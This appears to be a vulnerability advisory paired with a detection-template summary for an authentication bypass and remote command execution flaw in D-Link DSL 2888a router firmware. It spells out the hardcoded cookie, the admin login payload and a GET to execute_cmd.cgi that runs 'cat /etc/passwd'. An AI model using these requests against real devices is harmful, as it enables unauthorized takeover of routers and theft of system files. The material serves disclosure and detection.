## Vulnerability
D-Link DSL 2888a devices with firmware prior to AU_2.31_V1.1.47ae55 are vulnerable to authentication bypass issues which can lead to remote command execution. An unauthenticated attacker could bypass authentication to access authenticated pages and functionality.

CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (8.8)  
CWE-287

## PoC / Detection
Classification: rce

The template performs authentication bypass via a POST request to `/` using the hardcoded cookie `uid=6gPjT2ipmNz` and admin login payload (`username=admin&password=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b`). It then issues a GET request to `/cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=cat%20/etc/passwd` with the same cookie. Success is confirmed by HTTP 200 status and regex matches for `nobody:[x*]:65534:65534` or `root:.*:0:0:` in the response body.
